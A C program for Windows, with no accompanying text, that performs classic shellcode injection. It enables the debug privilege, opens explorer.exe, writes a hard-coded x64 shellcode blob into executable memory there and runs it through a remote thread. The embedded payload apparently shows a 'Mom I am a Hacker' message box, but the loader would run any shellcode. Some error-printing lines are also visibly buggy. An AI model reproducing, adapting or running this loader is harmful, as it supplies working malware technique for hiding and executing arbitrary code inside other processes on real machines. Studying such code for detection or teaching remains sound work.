#include <stdio.h>
#include <windows.h>
#include <TlHelp32.h>

int main(void)
{
    HANDLE hProcessToken;

    BOOL kfk = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hProcessToken);

    if (!kfk)
    {
        printf("[-] Error to Open The Process Token" + GetLastError());
        return 1;
    }

    LUID lpLuid;
    BOOL idk = LookupPrivilegeValueA(NULL, SE_DEBUG_NAME, &lpLuid);

    if (!idk)
    {
        printf("[-] Error to Retrieve the LUID" + GetLastError());
        return 1;
    }

    TOKEN_PRIVILEGES tp;

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = lpLuid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL mnh = AdjustTokenPrivileges(hProcessToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);

    if (!mnh)
    {
        printf("[-] Error to Adjust Token Privileges %lu\n", GetLastError());
        return 1;
    }

    CloseHandle(hProcessToken);

    PROCESSENTRY32 entry;
    DWORD pid;

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (Process32First(snapshot, &entry) == TRUE)
    {
        while (Process32Next(snapshot, &entry) == TRUE)
        {
            if (stricmp(entry.szExeFile, "explorer.exe") == 0)
            {
                pid = entry.th32ProcessID;
            }
        }
    }

    HANDLE hExplorer = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

    if (hExplorer == NULL)
    {
        printf("[-] Error to Open Process: Explorer.exe %lu\n", GetLastError());
        return 1;
    }

    unsigned char shellCode[] = {
        "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xcc\x00\x00\x00\x41"
        "\x51\x41\x50\x52\x48\x31\xd2\x51\x65\x48\x8b\x52\x60\x48"
        "\x8b\x52\x18\x48\x8b\x52\x20\x56\x48\x0f\xb7\x4a\x4a\x48"
        "\x8b\x72\x50\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02"
        "\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x48\x8b"
        "\x52\x20\x41\x51\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18"
        "\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00"
        "\x48\x85\xc0\x74\x67\x48\x01\xd0\x44\x8b\x40\x20\x49\x01"
        "\xd0\x8b\x48\x18\x50\xe3\x56\x48\xff\xc9\x4d\x31\xc9\x41"
        "\x8b\x34\x88\x48\x01\xd6\x48\x31\xc0\xac\x41\xc1\xc9\x0d"
        "\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39"
        "\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b"
        "\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48"
        "\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41"
        "\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
        "\x8b\x12\xe9\x4b\xff\xff\xff\x5d\xe8\x0b\x00\x00\x00\x75"
        "\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00\x59\x41\xba\x4c"
        "\x77\x26\x07\xff\xd5\x49\xc7\xc1\x00\x00\x00\x00\xe8\x12"
        "\x00\x00\x00\x4d\x6f\x6d\x20\x49\x20\x61\x6d\x20\x61\x20"
        "\x48\x61\x63\x6b\x65\x72\x00\x5a\xe8\x12\x00\x00\x00\x4d"
        "\x6f\x6d\x20\x49\x20\x61\x6d\x20\x61\x20\x48\x61\x63\x6b"
        "\x65\x72\x00\x41\x58\x48\x31\xc9\x41\xba\x45\x83\x56\x07"
        "\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff\xd5"};

    LPVOID lpRemoteMemory = VirtualAllocEx(hExplorer, NULL, sizeof(shellCode), MEM_COMMIT | MEM_RESERVE , PAGE_EXECUTE_READWRITE);

    BOOL opk = WriteProcessMemory(hExplorer, lpRemoteMemory, shellCode, sizeof(shellCode), NULL);

    if (!opk)
    {
        printf("[-] Error to Write in Explorer.exe %lu\n", GetLastError());
        return 1;
    }

    HANDLE hThread = CreateRemoteThread(hExplorer, NULL, 0, (LPTHREAD_START_ROUTINE)lpRemoteMemory, NULL, 0, NULL);

    if (!hThread)
    {
        printf("[-] Error to create remote Thread %lu\n", GetLastError());
        return 1;
    }

    printf("[+] Remote thread created successfully!\n");

    CloseHandle(hThread);
    CloseHandle(hExplorer);

    return 0;
}